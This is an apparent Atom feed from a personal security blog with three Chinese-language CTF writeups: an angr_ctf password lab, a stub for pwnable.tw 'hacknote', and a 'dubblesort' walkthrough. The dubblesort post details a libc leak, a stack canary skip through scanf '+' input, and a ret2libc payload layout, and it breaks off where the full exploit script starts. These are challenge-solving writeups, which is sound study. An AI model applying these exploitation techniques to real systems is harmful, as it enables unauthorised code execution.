<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kazma&#39;s blog</title>
  
  <subtitle>Decoding My Life: Tales of Code, Cyber, and Campus Life</subtitle>
  <link href="https://kazma.tw/atom.xml" rel="self"/>
  
  <link href="https://kazma.tw/"/>
  <updated>2024-04-30T10:36:06.731Z</updated>
  <id>https://kazma.tw/</id>
  
  <author>
    <name>kazma</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Angr_CTF Writeups</title>
    <link href="https://kazma.tw/2024/04/30/Angr-CTF-Writeups/"/>
    <id>https://kazma.tw/2024/04/30/Angr-CTF-Writeups/</id>
    <published>2024-04-30T07:21:23.000Z</published>
    <updated>2024-04-30T10:36:06.731Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Angr-CTF-Writeups"><a href="#Angr-CTF-Writeups" class="headerlink" title="Angr_CTF Writeups"></a>Angr_CTF Writeups</h1><p>這篇文章會來整理透過 <a class="link"   href="https://github.com/jakespringer/angr_ctf" >angr_ctf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 這些 labs 學到有關於 <a class="link"   href="https://angr.io/" >angr <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的一些技巧和使用方式，如果有發現任何錯誤或是改進的建議歡迎聯絡我！</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Angr 是一個由 <a class="link"   href="https://shellphish.net/" >ShellPhish <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 開發並用 Python 編寫的框架，專門用來自動化二進制分析，有很多廣泛的應用，也很多提供豐富好用的 API。<br>除了應用在 CTF 上之外，也很常拿來協助學術研究以及業界的漏洞挖掘和惡意程式分析，總之就是很強大的工具就對了 XD。<br>Sources:</p><ul><li>labs: <a class="link"   href="https://github.com/jakespringer/angr_ctf" >https://github.com/jakespringer/angr_ctf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>angr 官網: <a class="link"   href="https://angr.io/" >https://angr.io/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>ShellPhish: <a class="link"   href="https://shellphish.net/" >https://shellphish.net/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>scenario examples:<ul><li><a class="link"   href="https://ithelp.ithome.com.tw/articles/10223048?sc=rss.iron" >https://ithelp.ithome.com.tw/articles/10223048?sc=rss.iron <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://youtu.be/RCgEIBfnTEI?si=T1eZ01vw9ocdIahg" >https://youtu.be/RCgEIBfnTEI?si=T1eZ01vw9ocdIahg <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://youtu.be/6rp5yPLAU_U?si=tTk2V1Mqca1in4MU" >https://youtu.be/6rp5yPLAU_U?si=tTk2V1Mqca1in4MU <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul></li></ul><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>今天練習的題目來自下面這個 repositories：<br><a class="link"   href="https://github.com/jakespringer/angr_ctf" >https://github.com/jakespringer/angr_ctf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>題目都放在 angr_ctf&#x2F;dist&#x2F; 下面，附上指令：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jakespringer/angr_ctf.git</span><br><span class="line">pip install angr</span><br></pre></td></tr></table></figure></div><p>安裝 angr 的時候可能會出現有些套件的版本不符合要求，大家再依自己的狀況調整就行，那我們趕緊開始。</p><h2 id="Labs"><a href="#Labs" class="headerlink" title="Labs"></a>Labs</h2><h3 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h3><p>這題就是逆向 CTF 很常出現的 password 題，執行起來如下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./00_angr_find</span><br><span class="line">Enter the password: 1234</span><br><span class="line">Try again.</span><br></pre></td></tr></table></figure></div><p>首先跟 pwntools 一樣我們需要先把 binary 載進來然後讓 angr 可以對他做分析：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = Project(<span class="string">&#x27;./00_angr_find&#x27;</span>, load_options = &#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;, main_opts = &#123;<span class="string">&#x27;base_addr&#x27;</span>: <span class="number">0x804850</span>&#125;)</span><br></pre></td></tr></table></figure></div><p><code>load_options = &#123;&#39;auto_load_libs&#39;: False&#125;</code>: 是設定參數讓他不要載入其他的依賴文件，可以降低複雜性跟執行時間。<br><code>main_opts = &#123;&#39;base_addr&#39;: 0x804850&#125;</code>: 這裡在設定 entrypoint，這裡示範用 r2 找，直接打開就會看到了：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ r2 00_angr_find</span><br><span class="line">[0x08048450]&gt;</span><br></pre></td></tr></table></figure></div><p>再來會模擬從入口點開始執行的狀態，然後會使用 SimulationManager 這個模擬管理器來控制程式的執行和探索路徑之類的行爲：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">state = p.factory.entry_state()</span><br><span class="line">simgr = p.factory.simgr(state)</span><br></pre></td></tr></table></figure></div><p>再來我告訴 SimulationManager 我想要程式輸出密碼正確的訊息，所以我給他那個 flow 上的隨便一個地址，一樣可以用靜態分析來找地址：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/00_good_job.png"                      alt="good_job"                ></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simgr.explore(find = <span class="number">0x8048675</span>)</span><br></pre></td></tr></table></figure></div><p>最後我們來看 <code>simgr.found</code> 是否有找到到達指定路徑的狀態，路徑可能不只一條，所以 found 會是一個 list，而我們試著在其中一個成功的狀態中去查看 stdin 應該要是什麼，所以會使用 <code>posix.dumps(0)</code> 來查看。<br>POSIX（Portable Operating System Interface）是一個由 IEEE 定義的一系列 API 標準，簡單來說他可以使我們在不同操作系統上確定應用程式的行為一致，也可以使用這些接口來模擬應用程式如何與操作系統交互。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    sol = simgr.found[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(sol.posix.dumps(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;QQ&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>exploit00.py:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> angr <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = Project(<span class="string">&#x27;./00_angr_find&#x27;</span>, load_options = &#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;, main_opts = &#123;<span class="string">&#x27;base_addr&#x27;</span>: <span class="number">0x804850</span>&#125;)</span><br><span class="line"></span><br><span class="line">state = p.factory.entry_state()</span><br><span class="line">simgr = p.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find = <span class="number">0x8048675</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    sol = simgr.found[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(sol.posix.dumps(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;QQ&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>執行結果：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit00.py</span><br><span class="line">WARNING  | 2024-04-30 04:26:52,924 | cle.loader     | 00_angr_find: base_addr was specified but the object is not PIC. specify force_rebase=True to override</span><br><span class="line">WARNING  | 2024-04-30 04:26:53,021 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing register with an unspecified value. This could indicate unwanted behavior.</span><br><span class="line">WARNING  | 2024-04-30 04:26:53,021 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:</span><br><span class="line">WARNING  | 2024-04-30 04:26:53,021 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state</span><br><span class="line">WARNING  | 2024-04-30 04:26:53,021 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to make unknown regions hold null</span><br><span class="line">WARNING  | 2024-04-30 04:26:53,021 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to suppress these messages.</span><br><span class="line">WARNING  | 2024-04-30 04:26:53,021 | angr.storage.memory_mixins.default_filler_mixin | Filling register edi with 4 unconstrained bytes referenced from 0x80486b1 (__libc_csu_init+0x1 <span class="keyword">in</span> 00_angr_find (0x80486b1))</span><br><span class="line">WARNING  | 2024-04-30 04:26:53,023 | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx with 4 unconstrained bytes referenced from 0x80486b3 (__libc_csu_init+0x3 <span class="keyword">in</span> 00_angr_find (0x80486b3))</span><br><span class="line">WARNING  | 2024-04-30 04:26:54,235 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff60 with 4 unconstrained bytes referenced from 0x8100000 (strcmp+0x0 <span class="keyword">in</span> extern-address space (0x0))</span><br><span class="line">b<span class="string">&#x27;JXWVXRKX&#x27;</span></span><br></pre></td></tr></table></figure></div><p>可以看到雖然最後有輸出密碼，但是噴了一堆警告，主要是因為在模擬程式執行是一個很複雜的狀況，有很多複雜的參數可以設定，如果設定的不完全可能會影響準確性，而閱讀這些也可以幫助我們之後更高效的學習使用 angr 讓分析更順利。<br>Result:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./00_angr_find</span><br><span class="line">Enter the password: JXWVXRKX</span><br><span class="line">Good Job.</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Angr-CTF-Writeups&quot;&gt;&lt;a href=&quot;#Angr-CTF-Writeups&quot; class=&quot;headerlink&quot; title=&quot;Angr_CTF Writeups&quot;&gt;&lt;/a&gt;Angr_CTF Writeups&lt;/h1&gt;&lt;p&gt;這篇文章會來整理透過</summary>
      
    
    
    
    
    <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="angr" scheme="https://kazma.tw/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.tw hacknote Writeup</title>
    <link href="https://kazma.tw/2024/04/20/Pwnable-tw-hacknote-Writeup/"/>
    <id>https://kazma.tw/2024/04/20/Pwnable-tw-hacknote-Writeup/</id>
    <published>2024-04-20T02:37:31.000Z</published>
    <updated>2024-04-27T00:59:12.321Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwnable-tw-hacknote"><a href="#Pwnable-tw-hacknote" class="headerlink" title="Pwnable.tw - hacknote"></a>Pwnable.tw - hacknote</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>A good Hacker should always take good notes!</p></blockquote><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   href="https://pwnable.tw/challenge/#5" >https://pwnable.tw/challenge/#5 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>常見的 heap 選單題。</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file hacknote</span><br><span class="line">hacknote: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter ld-2.23.so, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped</span><br></pre></td></tr></table></figure></div><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec hacknote</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/pwnabletw/hacknote/hacknote&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8046000)</span><br></pre></td></tr></table></figure></div><h3 id="dubblesort"><a href="#dubblesort" class="headerlink" title=".&#x2F;dubblesort"></a>.&#x2F;dubblesort</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./hacknote</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure></div><h2 id="0x2-patchelf"><a href="#0x2-patchelf" class="headerlink" title="0x2 patchelf"></a>0x2 patchelf</h2><p>詳細可以參考 <a href="https://kazma.tw/2024/04/19/Patchelf-Glibc-all-in-one-Combo/">這篇教學</a></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ patchelf --set-interpreter ./ld-2.23.so hacknote</span><br><span class="line">└─$ patchelf --replace-needed libc.so.6 ./libc_32.so.6 hacknote</span><br><span class="line">└─$ ldd hacknote</span><br><span class="line">        linux-gate.so.1 (0xf7f4b000)</span><br><span class="line">        ./libc_32.so.6 (0xf7d91000)</span><br><span class="line">        ld-2.23.so =&gt; /lib/ld-linux.so.2 (0xf7f4d000)</span><br></pre></td></tr></table></figure></div><h2 id="0x2-Fuzzing-Analyze"><a href="#0x2-Fuzzing-Analyze" class="headerlink" title="0x2 Fuzzing &amp; Analyze"></a>0x2 Fuzzing &amp; Analyze</h2><h2 id="0x3-Exploitation"><a href="#0x3-Exploitation" class="headerlink" title="0x3 Exploitation"></a>0x3 Exploitation</h2><h2 id="0x4-Exploit"><a href="#0x4-Exploit" class="headerlink" title="0x4 Exploit"></a>0x4 Exploit</h2><h3 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pwnable-tw-hacknote&quot;&gt;&lt;a href=&quot;#Pwnable-tw-hacknote&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.tw - hacknote&quot;&gt;&lt;/a&gt;Pwnable.tw - hacknote&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
    
    <category term="heap" scheme="https://kazma.tw/tags/heap/"/>
    
    <category term="uaf" scheme="https://kazma.tw/tags/uaf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.tw dubblesort Writeup</title>
    <link href="https://kazma.tw/2024/04/19/Pwnable-tw-dubblesort-Writeup/"/>
    <id>https://kazma.tw/2024/04/19/Pwnable-tw-dubblesort-Writeup/</id>
    <published>2024-04-19T06:28:20.000Z</published>
    <updated>2024-04-20T03:08:33.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwnable-tw-dubblesort"><a href="#Pwnable-tw-dubblesort" class="headerlink" title="Pwnable.tw - dubblesort"></a>Pwnable.tw - dubblesort</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>Sort the memory!</p></blockquote><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   href="https://pwnable.tw/challenge/#4" >https://pwnable.tw/challenge/#4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>一個會問你名字然後 bubble sort 的小程式。</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file dubblesort</span><br><span class="line">dubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter ./ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped</span><br></pre></td></tr></table></figure></div><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec ./dubblesort</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/pwnabletw/dubblesort/dubblesort&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></div><h3 id="dubblesort"><a href="#dubblesort" class="headerlink" title=".&#x2F;dubblesort"></a>.&#x2F;dubblesort</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./dubblesort</span><br><span class="line">What your name :kazma</span><br><span class="line">Hello kazma</span><br><span class="line">/,How many numbers <span class="keyword">do</span> you what to <span class="built_in">sort</span> :5</span><br><span class="line">Enter the 0 number : 3</span><br><span class="line">Enter the 1 number : 2</span><br><span class="line">Enter the 2 number : 8</span><br><span class="line">Enter the 3 number : 1</span><br><span class="line">Enter the 4 number : 5</span><br><span class="line">Processing......</span><br><span class="line">Result :</span><br><span class="line">1 2 3 5 8</span><br></pre></td></tr></table></figure></div><h2 id="0x2-patchelf"><a href="#0x2-patchelf" class="headerlink" title="0x2 patchelf"></a>0x2 patchelf</h2><p>詳細可以參考 <a href="https://kazma.tw/2024/04/19/Patchelf-Glibc-all-in-one-Combo/">這篇教學</a></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ patchelf --set-interpreter ./ld-2.23.so dubblesort</span><br><span class="line">└─$ patchelf --replace-needed libc.so.6 ./libc_32.so.6 dubblesort</span><br><span class="line">└─$ ldd dubblesort</span><br><span class="line">        linux-gate.so.1 (0xf7fba000)</span><br><span class="line">        ./libc_32.so.6 (0xf7df7000)</span><br><span class="line">        ./ld-2.23.so =&gt; /lib/ld-linux.so.2 (0xf7fbc000)</span><br></pre></td></tr></table></figure></div><h2 id="0x2-Fuzzing-Analyze"><a href="#0x2-Fuzzing-Analyze" class="headerlink" title="0x2 Fuzzing &amp; Analyze"></a>0x2 Fuzzing &amp; Analyze</h2><p>程式很小一個，從輸入點可以看到兩個漏洞如下：</p><ul><li><code>read</code> 後沒有加 <code>null byte</code>，可以 leak libc_base：</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dubble_read.png"                      alt="read"                ></p><ul><li>可以 oob write，這點從 fuzzing 會觸發 <code>stack smashing detected</code> 可以發現它能覆蓋掉 canary：</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dubble_scanf.png"                      alt="scanf"                ></p><h2 id="0x3-Exploitation"><a href="#0x3-Exploitation" class="headerlink" title="0x3 Exploitation"></a>0x3 Exploitation</h2><p>攻擊思路如下：</p><ol><li>先透過第一個 <code>read</code> 去 leak libc_base。</li><li>透過 oob write 想辦法蓋對 canary 或是繞過它。</li><li>ret2libc 的 <code>system</code> 跟 <code>/bin/sh</code></li><li>處理 sort </li><li>快樂 RCE</li></ol><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><ul><li>我們用 gdb 來分析 stack 上面的殘渣：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ gdb -q dubblesort</span><br><span class="line">gef➤  start</span><br><span class="line">gef➤  <span class="built_in">break</span> <span class="built_in">read</span>@plt</span><br><span class="line">gef➤  c</span><br><span class="line">gef➤  fin</span><br><span class="line">aaaa</span><br><span class="line">gef➤  <span class="built_in">break</span> __printf_chk@plt</span><br><span class="line">gef➤  c</span><br><span class="line">gef➤  gef config context.nb_lines_stack 30</span><br><span class="line">gef➤  context stack</span><br><span class="line">gef➤  vmmap</span><br></pre></td></tr></table></figure></div>方法大致如上。<br>接著 demo 腳本，stack 如下，<code>0x61616161</code> 是我們的輸入，最後填上 ‘z’ 來幫助我們收集 leak 的資料，也就是 <code>0x7a</code>，後面緊接著就是 libc 裡面的某個地址：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dubble_base.png"                      alt="libc"                ><br>收集 leak 出來的地址之後再 <code>vmmap</code> 可以算出跟當前 libc_base 的差值，成功計算完，執行會長得像最上面那樣。</li></ul><h3 id="繞過-canary"><a href="#繞過-canary" class="headerlink" title="繞過 canary"></a>繞過 canary</h3><p>試了一下發現想不到有什麼方式可以 leak 出 canary 又填回去，但上網查會發現 <code>scanf</code> 有一些特殊的性質，例如這裡 <code>scanf</code> 的 <code>format specifier</code> 是 <code>%u</code>，也就是他會期待收到一個無號十進制整數，如果填 <code>a</code> 會直接導致後面的 <code>scanf</code> 都失敗，因為 <code>stdin</code> 一直沒有被取走，而像是 <code>+</code>、<code>-</code> 不會讓 <code>scanf</code> 失敗但也不會改變陣列原本的值，我們可以利用這個來跳過 canary 的輸入。<br>一樣用 gdb 可以查到 canary 相對於 array[0] 的 offset，這裡輸入 5 個數字分別是 1 ~ 5，也可以用 ida 或其他逆向工具直接算：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dubble_canary.png"                      alt="canary"                ><br><code>(0x7c - 0x1c) / 4 + 1 = 25</code><br>所以 canary 在 array[24]，到後會填 <code>+</code> 或 <code>-</code>。</p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">success(<span class="string">&#x27;libc_base -&gt; %s&#x27;</span> % <span class="built_in">hex</span>(l.address))</span><br><span class="line">success(<span class="string">&#x27;system -&gt; %s&#x27;</span> % <span class="built_in">hex</span>(l.sym.system))</span><br><span class="line">success(<span class="string">&#x27;bin_sh -&gt; %s&#x27;</span> % <span class="built_in">hex</span>(<span class="built_in">next</span>(l.search(<span class="string">&#x27;/bin/sh\0&#x27;</span>))))</span><br></pre></td></tr></table></figure></div><h3 id="處理排序"><a href="#處理排序" class="headerlink" title="處理排序"></a>處理排序</h3><p>因為最後他會把陣列內的值排序，所以我們可以先塞 24 個 1，繞過 canary，然後一路放 <code>system</code> 到 ret，再補四個 bytes 補齊 ret 跟 call 的差值，最後放上 <code>&#39;/bin/sh\0&#39;</code>，canary 高機率都小於 libc 的地址，<code>system</code> 的 offset 也剛好比 <code>&#39;/bin/sh\0&#39;</code> 小，畫成表格可以更好理解：</p><table><thead><tr><th align="center">array</th><th align="center">stack</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">a[0]~a[23]</td><td align="center"></td><td align="center">‘1’</td></tr><tr><td align="center">a[24]</td><td align="center">canary</td><td align="center">‘+’</td></tr><tr><td align="center">a[25]~a[30]</td><td align="center"></td><td align="center">“l.sym.system”</td></tr><tr><td align="center">a[31]</td><td align="center">ebp</td><td align="center">“l.sym.system”</td></tr><tr><td align="center">a[32]</td><td align="center">ret</td><td align="center">“l.sym.system”</td></tr><tr><td align="center">a[33]</td><td align="center"></td><td align="center">“l.sym.system”</td></tr><tr><td align="center">a[34]</td><td align="center"></td><td align="center">“next(l.search(‘&#x2F;bin&#x2F;sh\0’))”</td></tr></tbody></table><h3 id="環境差異"><a href="#環境差異" class="headerlink" title="環境差異"></a>環境差異</h3><p>在本地成功 get shell 了：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dubble_shell.png"                      alt="shell"                ><br>但送到遠端會發現 libc_base 算起來不對，感覺是環境不同導致 stack 上面的殘值有所不同，但已經盡可能的透過 <code>patchelf</code> 去模擬一樣的環境，猜測是因為遠端是 32 位元的系統。</p><h2 id="0x4-Exploit"><a href="#0x4-Exploit" class="headerlink" title="0x4 Exploit"></a>0x4 Exploit</h2><p>上網查到正確的 offset 補上後就成功 get shell 了！<br>exploit.py 如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td 